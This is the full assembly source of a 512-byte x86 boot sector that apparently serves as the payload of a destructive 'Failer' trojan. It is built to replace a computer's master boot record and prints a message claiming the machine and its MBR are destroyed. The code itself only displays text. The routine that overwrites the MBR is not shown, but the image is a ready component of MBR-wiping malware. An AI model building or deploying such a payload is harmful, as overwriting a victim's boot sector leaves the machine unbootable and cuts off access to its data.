[BITS 16]
[ORG 7C00h]
  jmp main
main:
  xor ax, ax
  mov ds, ax
  cld
  mov ax, 0012h
  int 10h
  mov si, string
  mov bl, 15
  call printstr
  jmp $

printstr:
  mov bh, 0
print:
    lodsb
    cmp al, 0
    je done
    mov ah, 0Eh
    int 10h
    jmp print
  done:
    ret

string db "Your computer is trashed by failer trojan", 13, 10, "if you see that screen for your mbr is destroyed!", 13, 10, "", 13, 10, "Always Remember! Failer is REAL", 13, 10, "", 13, 10, "Created by Jammin, Modifications to the code are prohibited."

times 510-($-$$) db 0
dw 0AA55h